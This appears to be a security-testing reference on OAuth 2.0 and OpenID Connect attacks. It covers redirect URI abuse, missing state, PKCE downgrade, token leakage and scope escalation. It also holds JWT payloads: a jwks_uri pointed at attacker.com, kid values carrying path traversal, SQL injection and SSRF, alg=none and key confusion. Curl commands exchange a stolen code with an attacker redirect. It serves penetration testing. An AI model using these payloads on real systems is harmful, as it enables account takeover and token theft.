---
category: technique
title: "OAuth 2.0 and OpenID Connect Attack Techniques"
tags: [oauth, oidc, openid-connect, jwt, csrf, pkce, token-theft, redirect-uri, state-parameter, implicit-flow]
---

# OAuth 2.0 and OpenID Connect Attacks

OAuth is complicated enough that most implementations have bugs. The complexity creates attack surface: redirect URI validation, state parameter handling, token leakage, and code-to-token exchange are all places where implementations diverge from the spec in exploitable ways.

---

## Redirect URI manipulation

The most common OAuth bug. The authorization server must validate the `redirect_uri` exactly. "Exactly" in practice ranges from "we check the registered domain" to "we do an exact string match."

**Open redirect abuse.** If the validation only checks the domain, any open redirect on that domain works as a valid `redirect_uri`. The auth code lands in your hands.

```
https://victim.com/oauth/authorize
  ?redirect_uri=https://victim.com/redirect?to=https://attacker.com
  &response_type=code
  &client_id=app
```

**Path traversal.** Some validators check the prefix: if registered URI is `https://app.com/callback`, they accept `https://app.com/callback/../admin` or `https://app.com/callback%2F%2E%2E%2Fadmin`.

**Fragment injection.** If the callback is on an attacker-controlled page (e.g., Markdown rendering, embedded iframe), the authorization code may be in the URL fragment. A page at the attacker's registered domain can read it via JavaScript.

---

## State parameter missing or predictable

The `state` parameter is the CSRF protection for OAuth. Many implementations:
- Omit it entirely (CSRF attack: trick victim into authorizing with the attacker's account)
- Use a predictable value (timestamp, user ID, fixed string)
- Validate it against session but the session is not tied to a device

**CSRF via missing state:**
1. Start the authorization flow yourself, get a valid `code`
2. Stop before exchanging it
3. Embed the callback URL (with your `code`) in a page
4. When the victim visits, the callback fires with your authorization code linked to their session

---

## Authorization code interception (PKCE bypass)

Without PKCE, if you can intercept the authorization code (via referrer header, browser history, proxy logs, log injection), you can exchange it for a token. PKCE prevents this - but:
- Check if PKCE is required or just optional (some servers allow downgrade to no-PKCE)
- Check if `code_verifier` validation is actually enforced

---

## Token leakage via referrer

If the authorization code or access token ends up in the URL (implicit flow, or `response_mode=query`), any third-party resource on the callback page receives it via the `Referer` header.

Look for: analytics scripts, CDN assets, embedded widgets on pages that receive tokens.

---

## Token scope escalation

Some servers allow requesting broader scopes than registered. Try adding undocumented scopes (`admin`, `write:all`, `profile:private`) to the scope parameter. Some implementations grant whatever is requested without validation.

---

## Refresh token abuse

- Refresh tokens should be single-use in modern implementations. Test: use a refresh token twice. Does the second use succeed? If yes, the server doesn't rotate them.
- Refresh token leakage: if stored in localStorage, any XSS can steal them. Access tokens expire; refresh tokens are permanent without rotation.

---

## Client secret exposure

- Mobile apps and SPAs cannot keep client secrets. For confidential clients, the client secret should never appear in browser traffic.
- Find client secrets: decompile mobile apps, check JavaScript bundles, check `/.well-known/openid-configuration` for misconfigured dynamic registration.

---

## JWT deep cuts

**jwks_uri manipulation.** Some OIDC implementations trust the `jwks_uri` field in the JWT header itself. Replace it with your own JWKS endpoint, sign with your key, and the server fetches your public key to verify your own token.

```json
{"alg": "RS256", "jwks_uri": "https://attacker.com/jwks.json"}
```

**kid injection variants.** The `kid` header is sometimes used as a filename, SQL key, or URL to fetch the signing key:
- `"kid": "../../dev/null"` - empty key, HMAC secret becomes empty string
- `"kid": "' UNION SELECT 'attacker_key'--"` - SQLi in key lookup
- `"kid": "https://attacker.com/key"` - SSRF on key fetch

**Sensitive data in payload.** JWT payload is base64-encoded, never encrypted. Always decode manually:
```bash
echo "eyJzdWIiOiIxMjM0NTY3ODkwIn0" | base64 -d
# look for: internal IDs, emails, roles, service names, env flags
```

**Expired token not checked.** Try replaying an old token from browser history or proxy logs. Some implementations skip `exp` validation.

**Microservice token confusion.** If services A and B share the same JWT secret, a token issued for A may be accepted by B. Different services may also interpret the same claim differently (e.g., `role: "admin"` means different things in different services).

---

## SSO trust chain attacks

If the victim app trusts any of several identity providers, compromising any one of them compromises all downstream apps. Also:

**Same issuer, different app.** If two apps share the same OAuth server, a token issued for App A may be accepted by App B if the `audience` (`aud` claim) isn't validated.

```python
# Check if App B validates the `aud` claim
token_for_app_a = get_token(client_id="app_a")
try_it_on_app_b(token_for_app_a)
```

---

## Enumeration checklist

```bash
# Find all OAuth endpoints
curl -s https://target.com/.well-known/openid-configuration | jq .
curl -s https://target.com/.well-known/oauth-authorization-server | jq .

# Check token endpoint for weak validation
curl -X POST https://target.com/oauth/token \
  -d "grant_type=authorization_code&code=STOLEN&redirect_uri=https://attacker.com"

# Check if implicit flow is still supported (leaks token in URL)
GET /oauth/authorize?response_type=token&...

# Check PKCE downgrade
GET /oauth/authorize?response_type=code&code_challenge_method=&...
```

---

## Tools

```bash
# Detect OAuth misconfigurations automatically
nuclei -u https://target.com -tags oauth

# Manual testing helper
pip install jwt-tool
python3 jwt_tool.py <token> -M at  # all attack modes
python3 jwt_tool.py <token> -X a   # alg=none attack
python3 jwt_tool.py <token> -X k   # key confusion (RS256->HS256)
```
